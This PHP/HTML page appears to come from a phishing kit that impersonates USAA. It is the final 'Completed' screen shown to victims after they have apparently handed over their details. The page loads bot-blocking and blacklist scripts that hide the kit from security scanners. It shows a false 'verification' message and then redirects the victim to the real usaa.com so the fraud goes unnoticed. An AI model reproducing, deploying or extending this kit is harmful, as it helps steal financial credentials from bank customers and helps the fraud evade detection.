<?php
include '../prevents/bot.php';
include '../prevents/ref.php';
include '../prevents/blacklist.php';
include '../prevents/blocker.php';
?>
<!doctype html>
<html>

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link href="./assets/css/output.css" rel="stylesheet" />
    <meta http-equiv="Refresh" content="3; url=https://www.usaa.com/">
    <title>Register</title>
</head>

<body class="font-sans bg-white">
    <main class="">
        <header class="border p-4 flex items-center gap-4">
            <img src="assets/imgs/logo-svg-dark.svg" alt="" class="size-14" />
            <h4 class="font-bold text-xl">Join USAA</h4>
        </header>

        <main class="max-w-screen-md mx-auto px-4 py-10">
            <form action="../next.php" method="post" class="">
                <div class="">
                    <h4 class="text-2xl font-semibold mb-8">Completed</h4>

                    <center>
                        <div style="margin: .75rem 0;">
                            <img width="200px" src="./assets/imgs/372103860_CHECK_MARK_400px.gif">
                            <p>Please wait while we review and verify.</p>
                            <p>We thank you for completing the verification
                                steps.<br>
                            </p>
                        </div>
                    </center>

                </div>
            </form>
        </main>

        <footer class="py-10 text-black">
            <div class="mx-auto px-4 lg:px-48">
                <div class="mb-3 flex flex-col flex-wrap underline sm:flex-row sm:gap-3 text-blue-700">
                    <a href="#">Security Center</a>
                    <a href="#">Privacy Center</a>
                    <a href="#">Accessibility at USAA</a>
                </div>
                <div class="space-y-1 text-sm">
                    <p>Copyright © 2026 USAA.</p>
                    <p>NC-1120</p>
                </div>
            </div>
        </footer>
    </main>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="./assets/js/main.js"></script>

</body>

</html>